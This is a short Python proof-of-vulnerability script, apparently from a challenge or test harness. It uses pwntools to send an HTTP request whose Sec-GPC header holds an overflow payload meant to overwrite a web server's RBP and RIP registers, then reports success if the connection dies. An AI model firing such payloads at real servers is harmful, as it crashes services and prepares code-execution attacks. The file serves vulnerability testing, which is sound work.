import sys
import requests as req
from pwn import *

def handler( signum, frame):
    print('sigalrm fired - time ran out')
    print('[SUCCESS] POV likely Succeeded')
    exit(0)

def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)
    print('Host ' + os.environ['HOST'] + ' and PORT: ' + os.environ['PORT'])

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(10)

    p = remote(HOST, PORT)
    inject = '\x90'* 24 + '\x41' * 88 + '\x42' * 8 + '\x43' * 6
    data = 'GET /index.html HTTP/1.1\r\nHost: 172.20.0.2:3040\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nSec-GPC: ' + inject + '\r\nSec-Fetch-Site: none\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-User: ?1\r\nSec-Fetch-Dest: document\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nIf-None-Match: "920195287"\r\nIf-Modified-Since: Mon, 21 Jun 2021 15:35:43 GMT\r\n\r\n'
    p.send(data)

    try:
        d = p.recv(4096, 10)
        print(d.decode('utf-8'))
        print('[ERROR] POV Failed')
    except:
        print('RIP=0x434343434343')
        print('RBP=0x4242424242424242')
        print('[SUCCESS] POV Succeeded')

 
if __name__ == '__main__':
    main()